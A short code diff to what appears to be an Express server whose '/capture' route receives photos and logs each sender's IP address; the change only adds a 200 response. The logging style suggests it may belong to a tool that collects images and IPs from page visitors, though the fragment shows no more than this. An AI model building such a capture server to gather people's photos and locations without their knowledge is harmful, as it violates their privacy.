@@ -32,7 +32,7 @@ app.post("/capture", (req, res) => {
 
         console.log(`[+] Photo received! IP: ${userIP}`);
         fs.appendFileSync("server.log", `Photo received! IP: ${userIP}\n`);
-
+        res.sendStatus(200);
     });
 });
 
